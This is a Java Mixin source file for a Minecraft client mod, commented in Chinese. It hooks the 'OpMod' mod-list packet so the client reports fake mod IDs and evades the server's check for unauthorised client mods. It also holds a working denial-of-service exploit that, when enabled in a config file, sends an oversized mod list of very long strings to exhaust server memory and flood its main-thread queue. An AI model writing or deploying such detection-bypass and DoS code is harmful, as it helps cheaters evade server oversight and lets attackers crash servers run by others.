package fku.org.example.fku.mixin; /* water */

import fku.org.example.fku.config.OpmodBypassConfig;
import fku.org.example.fku.config.OpmodDosConfig;
import fku.org.example.fku.util.ModScanResult;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Pseudo;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.jar.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
//绕过opmod的发包 功能 来自：Karucn / jks
//优化by：水是什么味道的，加入了列表对比，完全绕过opmod，不会播报了。

/**
 * 绕过 OpMod 的模组列表检测。
 *
 * 对比两个目录的 modId：
 *   目录1 = 客户端本地模组目录（可在 fku/opmod_bypass.json 中配置）
 *   目录2 = 服务器/平台自动安装的模组目录（可在 fku/opmod_bypass.json 中配置）
 *
 * 核心判定（无任何硬编码 modId 白名单）：
 *   每个 modId 的"出现次数" = 主 mod 计数 + jarjar 内嵌计数，jarjar 与主 mod 一块计数
 *   （两侧目录分别累加）。jarjar 内嵌依赖通过三种来源识别：mods.toml / MANIFEST.MF /
 *   内层 jar 文件名，覆盖 puzzlesaccessapi / kotlinforforge / xaerolib / mixinextras 等
 *   所有被父 mod 内嵌打包的依赖，无需硬编码。
 *
 *   判定规则（统一适用于普通 mod 与 jarjar 依赖，不存在"无条件伪装"）：
 *     仅当"目录2 出现次数 > 0 且 ≤ 目录1 出现次数"时才伪装。
 *     - 目录2（房间侧）含该 mod、且玩家没有多装副本 → 伪装，绕过"多出模组"。
 *     - 目录2 不含该 mod（count2 == 0）→ 保留真实 ID 上报，不会凭空移除导致"缺少模组"。
 *   这样既不硬编码名单，也不会因无条件移除内嵌依赖而触发房主侧"缺少依赖"的播报。
 * 该功能由赛博教员实现
 */
@Pseudo
@Mixin(targets = "lbxrman.mymod.opmod.network.PacketSendModList", remap = false)
public abstract class MixinPacketSendModList {

    @Shadow private Set<String> modIds;

    /** 伪装用的候选 modId（轮询使用） */
    private static final String[] FAKE_MOD_IDS = {"netease_official", "opmod"};

    /** 默认目录1（回退值） */
    private static final String DEFAULT_DIR_1 = "D:\\MCLDownload\\cache\\game\\V_1_20\\mods";
    /** 默认目录2（回退值） */
    private static final String DEFAULT_DIR_2 = "D:\\MCLDownload\\Game\\.minecraft\\mods";

    /** mods.toml 中提取 modId 的正则 */
    private static final Pattern MODID_PATTERN = Pattern.compile("modId\\s*=\\s*\"([^\"]+)\"");

    /** 缓存：目录1 的扫描结果 */
    private static ModScanResult cachedResult1 = null;
    /** 缓存：目录2 的扫描结果 */
    private static ModScanResult cachedResult2 = null;

    @Inject(method = "<init>(Ljava/util/Set;)V", at = @At("RETURN"), remap = false)
    private void onInit(Set<String> originalModIds, CallbackInfo ci) {
        try {
            if (modIds == null) return;
            if (originalModIds == null || originalModIds.isEmpty()) return;

            // 从配置读取目录路径（读取失败时回退到默认 D 盘路径）
            String dir1 = DEFAULT_DIR_1;
            String dir2 = DEFAULT_DIR_2;
            try {
                OpmodBypassConfig cfg = OpmodBypassConfig.getInstance();
                dir1 = cfg.modsDir1;
                dir2 = cfg.modsDir2;
            } catch (Exception ignored) {}

            // 扫描两个目录
            ModScanResult result1 = scanModsDir(Paths.get(dir1));
            ModScanResult result2 = scanModsDir(Paths.get(dir2));

            // 遍历原始列表
            //   仅当 mod 同时存在于两个目录中，且目录2 的出现次数 ≤ 目录1 的出现次数 → 伪装
            //   如果目录2 的出现次数严格大于目录1（用户多装了副本），则保留真实 ID
            //   其余情况均保留真实 ID
            List<String> originalList = new ArrayList<>(originalModIds);
            Set<String> result = new TreeSet<>();
            int fakeIdx = 0;
            for (String id : originalList) {
                // 合并主 mod 与 jarjar 内嵌 mod 的总出现次数
                int count1 = result1.mainMods.getOrDefault(id, 0) + result1.jarjarMods.getOrDefault(id, 0);
                int count2 = result2.mainMods.getOrDefault(id, 0) + result2.jarjarMods.getOrDefault(id, 0);

                // 计数时 jarjar 内嵌 mod 已与主 mod 合并（count = mainMods + jarjarMods），
                // 因此 jarjar 依赖与普通 mod 走完全相同的判定，不单独强制伪装：
                //   仅当"目录2 出现次数 > 0 且 ≤ 目录1 出现次数"时才伪装。
                // 这样既能绕过"多出模组"（目录2 把内嵌依赖算进去后，次数对齐），
                // 又不会误触发"缺少模组"——若房间侧没有该依赖（count2==0）则保留真实 ID 上报，
                // 不会凭空移除导致房主侧比对发现缺失。完全不依赖任何硬编码白名单。
                boolean shouldSpoof = count2 > 0 && count2 <= count1;

                if (shouldSpoof) {
                    result.add(FAKE_MOD_IDS[fakeIdx % FAKE_MOD_IDS.length]);
                    fakeIdx++;
                } else {
                    result.add(id);
                }
            }

            // 替换原列表
            modIds.clear();
            modIds.addAll(result);
        } catch (Throwable t) {
            // 任何异常都不应阻断加入流程：保留原列表即可。
        }
    }

    /**
     * OpMod DoS 利用（巨型 mod 列表攻击）。
     * 在伪装逻辑（onInit）执行完之后追加：当 opmod_dos.json 中 modListAttack 开启时，
     * 把 modIds 替换为一个“自报 size 巨大 + 单条字符串超长”的集合，
     * 服务端 decode 会按客户端自报的 size 预分配几十 MB 的 TreeSet，
     * 且每个包都会被 enqueueWork 推入主线程队列做差集 + 全服广播，形成无界队列堆积 → DoS。
     * 默认关闭，手动改 opmod_dos.json 才生效；不动原有伪装逻辑。
     */
    @Inject(method = "<init>(Ljava/util/Set;)V", at = @At("RETURN"), remap = false)
    private void onInitAttack(Set<String> originalModIds, CallbackInfo ci) {
        try {
            OpmodDosConfig cfg = OpmodDosConfig.getInstance();
            if (cfg == null || !cfg.modListAttack) return;
            if (modIds == null) return;

            int size = Math.max(1, cfg.modListSize);
            int strLen = Math.max(1, cfg.modListStringLen);
            StringBuilder sb = new StringBuilder(strLen);
            for (int i = 0; i < strLen; i++) sb.append((char) ('a' + (i % 26)));
            String base = sb.toString();

            Set<String> attack = new TreeSet<>();
            for (int i = 0; i < size; i++) {
                attack.add(base + "_" + i);
            }
            modIds.clear();
            modIds.addAll(attack);
        } catch (Throwable t) {
            // 不阻断正常流程
        }
    }

    /**
     * 扫描指定目录下的 .jar 文件，提取所有 modId（含 jarjar 内嵌），返回分离的扫描结果
     */
    private static ModScanResult scanModsDir(Path dir) {
        // 用目录路径做缓存键，各自缓存独立判空
        String dirKey = dir.toAbsolutePath().normalize().toString();
        if (dirKey.contains("cache") && cachedResult1 != null) return cachedResult1;
        if (dirKey.contains("minecraft") && cachedResult2 != null) return cachedResult2;

        ModScanResult result = new ModScanResult();
        if (!Files.isDirectory(dir)) return result;

        try (DirectoryStream<Path> stream = Files.newDirectoryStream(dir, "*.jar")) {
            for (Path jarPath : stream) {
                try {
                    scanSingleJar(jarPath, result, 0);
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}

        // 缓存结果
        if (dirKey.contains("cache")) cachedResult1 = result;
        if (dirKey.contains("minecraft")) cachedResult2 = result;
        return result;
    }

    /**
     * 扫描单个 jar：提取主 modId、递归提取内层 jarjar/jars 内嵌 modId，
     * 并累加该 jar（含其所有内层 jar）是否携带 MixinExtras 的标志。
     *
     * @param depth 递归深度，防止极端嵌套导致栈溢出
     */
    private static void scanSingleJar(Path jarPath, ModScanResult result, int depth) {
        try (JarFile jar = new JarFile(jarPath.toFile())) {
            // 1) 从三种来源提取 modId 候选：
            //    a) mods.toml      —— 真实 forge mod（[[mods]] 声明的 modId）
            //    b) MANIFEST.MF    —— 库/依赖型 mod（仅 Automatic-Module-Name / Implementation-Title /
            //                         Bundle-SymbolicName 声明，没有 mods.toml 的情况，例如部分被 shaded 的依赖）
            //    c) 内层 jar 文件名 —— 当该 jar 处于 META-INF/jarjar 或 META-INF/jars 内层时，
            //                         用文件名（去掉版本号）作为兜底 modId，覆盖 mods.toml 缺失的内嵌依赖
            Set<String> tomlIds = extractAllModIdsFromJar(jar);
            Set<String> manifestIds = extractModIdsFromManifest(jar);
            Set<String> nameIds = new HashSet<>();
            if (depth > 0) {
                nameIds.add(stripVersion(jarPath.getFileName().toString()));
            }

            // 计数统一：每个 id 出现一次只计入一张表，避免 mainMods+jarjarMods 合并时重复计数。
            //   - 真实 mod（来自 mods.toml）→ 仅 mainMods
            //   - 库 / 依赖型 modId（来自 MANIFEST 或内层 jar 文件名，且不在 mods.toml 中）
            //     → 仅 jarjarMods（无论顶层还是内层都视为内嵌依赖）
            // 最终判定时 count = mainMods + jarjarMods，jarjar 与主 mod 一块参与比较。
            for (String mid : tomlIds) {
                result.mainMods.merge(mid, 1, Integer::sum);
            }
            for (String mid : manifestIds) {
                if (tomlIds.contains(mid)) continue; // 已在 mods.toml 中按真实 mod 处理
                result.jarjarMods.merge(mid, 1, Integer::sum);
            }
            for (String mid : nameIds) {
                result.jarjarMods.merge(mid, 1, Integer::sum);
            }

            // 2) 本 jar 是否携带 MixinExtras（顶层 namelist 即可判断，覆盖 relocate 包路径 / services 标识）
            if (jarCarriesMixinExtras(jar)) {
                result.hasMixinExtras = true;
            }
            // 3) 递归扫描内层 jar（META-INF/jarjar/* 与 META-INF/jars/*），解开后再扫其中的 jarjar
            List<JarEntry> innerJars = new ArrayList<>();
            Enumeration<JarEntry> entries = jar.entries();
            while (entries.hasMoreElements()) {
                JarEntry e = entries.nextElement();
                String name = e.getName();
                if (!e.isDirectory()
                        && (name.startsWith("META-INF/jarjar/") || name.startsWith("META-INF/jars/"))
                        && name.endsWith(".jar")) {
                    innerJars.add(e);
                }
            }
            for (JarEntry innerEntry : innerJars) {
                try (InputStream is = jar.getInputStream(innerEntry)) {
                    // 把内层 jar 的原始字节抽到一个临时文件再递归扫描。
                    // 注意：必须用 jar.getInputStream(innerEntry) 的原始流直接拷贝，
                    // 不能套 ZipInputStream —— ZipInputStream 在未调用 getNextEntry() 前
                    // read() 立即返回 -1，会导致拷贝出空文件，从而使所有内嵌 jarjar 依赖
                    // （kotlinforforge / puzzlesaccessapi / xaerolib 等）扫描不到、
                    // 计数缺失、最终被 OpMod 误报为"多出模组"。
                    Path tmp = Files.createTempFile("fku_jarjar_", ".jar");
                    try {
                        Files.copy(is, tmp, StandardCopyOption.REPLACE_EXISTING);
                        if (depth < 6) scanSingleJar(tmp, result, depth + 1);
                    } finally {
                        try { Files.deleteIfExists(tmp); } catch (Exception ignored) {}
                    }
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
    }

    /**
     * 从 META-INF/MANIFEST.MF 中提取库/依赖型 modId 候选：
     *   Automatic-Module-Name / Implementation-Title / Bundle-SymbolicName
     * 这些字段常见于被 shaded / relocated 的依赖 jar（本身没有 mods.toml）。
     */
    private static Set<String> extractModIdsFromManifest(JarFile jar) {
        Set<String> ids = new HashSet<>();
        try {
            JarEntry me = jar.getJarEntry("META-INF/MANIFEST.MF");
            if (me == null) return ids;
            try (BufferedReader r = new BufferedReader(
                    new InputStreamReader(jar.getInputStream(me), StandardCharsets.UTF_8))) {
                String line;
                while ((line = r.readLine()) != null) {
                    String t = line.trim();
                    for (String key : new String[]{
                            "Automatic-Module-Name:",
                            "Implementation-Title:",
                            "Bundle-SymbolicName:"}) {
                        if (t.startsWith(key)) {
                            String v = t.substring(key.length()).trim();
                            if (!v.isEmpty()) ids.add(stripVersion(v));
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
        return ids;
    }

    /**
     * 去掉文件扩展名与末尾的版本号，得到干净的 modId 候选。
     * 例：xaerolib-1.0.jar → xaerolib；mixinextras-forge-0.4.0 → mixinextras-forge
     */
    private static String stripVersion(String s) {
        if (s.toLowerCase().endsWith(".jar")) s = s.substring(0, s.length() - 4);
        // 去掉末尾 -1.2.3 / -v4 / _build 之类的版本/构建后缀
        return s.replaceAll("[-_][0-9]+([.][0-9A-Za-z]+)*([.-][0-9A-Za-z]+)*$", "");
    }

    /**
     * 可靠检测一个 jar 是否携带 MixinExtras，覆盖以下情形：
     *   1) 原始包路径 ca/spottedleaf/mixinextras/
     *   2) 被重定位（relocate）后的任意包路径，如 ca/fxco/memoryleakfix/mixinextras/（按 "mixinextras/" 段匹配）
     *   3) 含 mixinextras 的内嵌 jar 文件名，如 mixinextras-forge-*.jar / mixinextras-*.jar
     *   4) META-INF/services/org.spongepowered.asm.service.mixin.IMixinService 内容含 MixinExtrasService
     */
    private static boolean jarCarriesMixinExtras(JarFile jar) {
        boolean servicesHit = false;
        Enumeration<JarEntry> entries = jar.entries();
        while (entries.hasMoreElements()) {
            JarEntry e = entries.nextElement();
            String name = e.getName();
            // (1)(2) 任意包路径下出现 mixinextras/ 子目录段
            if (name.contains("mixinextras/")) {
                return true;
            }
            // (3) 内嵌 jar 文件名含 mixinextras（如 META-INF/jarjar/mixinextras-forge-0.4.0.jar）
            int slash = name.lastIndexOf('/');
            String fileName = slash >= 0 ? name.substring(slash + 1) : name;
            if (fileName.contains("mixinextras") && fileName.endsWith(".jar")) {
                return true;
            }
            // (4) 收集 services 文件稍后读内容判断
            if (name.equals("META-INF/services/org.spongepowered.asm.service.mixin.IMixinService")) {
                servicesHit = true;
            }
        }
        if (servicesHit) {
            try {
                JarEntry se = jar.getJarEntry("META-INF/services/org.spongepowered.asm.service.mixin.IMixinService");
                if (se != null) {
                    try (BufferedReader r = new BufferedReader(
                            new InputStreamReader(jar.getInputStream(se), StandardCharsets.UTF_8))) {
                        String line;
                        while ((line = r.readLine()) != null) {
                            if (line.contains("MixinExtrasService")) {
                                return true;
                            }
                        }
                    }
                }
            } catch (Exception ignored) {}
        }
        return false;
    }

    /**
     * 从已打开的 jar 中读取 META-INF/mods.toml，提取所有 [[mods]] 下的 modId
     * （一个 mods.toml 中可能包含多个 [[mods]] 条目，如 setcommandblock + filterdetector）
     */
    private static Set<String> extractAllModIdsFromJar(JarFile jar) {
        Set<String> result = new HashSet<>();
        try {
            JarEntry entry = jar.getJarEntry("META-INF/mods.toml");
            if (entry == null) return result;

            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(jar.getInputStream(entry), StandardCharsets.UTF_8))) {
                String line;
                boolean inModsSection = false;
                while ((line = reader.readLine()) != null) {
                    String trimmed = line.trim();
                    // 进入 [[mods]] 区块
                    if (trimmed.startsWith("[[mods]]")) {
                        inModsSection = true;
                        continue;
                    }
                    // 进入其他区块（[[dependencies.xxx]] 等），退出 mods 模式
                    if (trimmed.startsWith("[[")) {
                        inModsSection = false;
                    }
                    if (inModsSection) {
                        Matcher m = MODID_PATTERN.matcher(trimmed);
                        if (m.find()) {
                            result.add(m.group(1));
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
        return result;
    }
}